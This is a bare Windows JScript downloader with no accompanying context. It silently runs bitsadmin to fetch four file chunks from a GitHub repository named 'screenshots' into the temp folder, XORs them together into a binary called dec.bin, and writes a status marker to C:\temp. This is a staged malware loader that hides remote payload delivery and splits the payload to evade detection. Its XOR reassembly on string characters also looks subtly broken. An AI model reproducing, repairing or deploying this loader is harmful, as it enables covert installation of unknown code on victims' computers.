var sh=new ActiveXObject("WScript.Shell");
var fso=new ActiveXObject("Scripting.FileSystemObject");
var t=fso.GetSpecialFolder(2);
for(var i=0;i<4;i++){sh.Run("bitsadmin /transfer j /download /priority high https://raw.githubusercontent.com/cem324/screenshots/main/c"+i+" \""+t+"\\c"+i+"\"",0,true);}
var b=[];for(var i=0;i<4;i++){var st=fso.OpenTextFile(t+"\\c"+i,1,false);var r=st.ReadAll();st.Close();b.push(r);}
var xr=[];var l=b[0].length;for(var k=0;k<l;k++){var v=b[0][k];for(var j=1;j<4;j++){v^=b[j][k]};xr.push(v)}
fso.CreateTextFile(t+"\\dec.bin").Write(String.fromCharCode.apply(null,xr));
fso.CreateTextFile("C:\\temp\\k7.txt").Write("OK "+xr.length+"b");
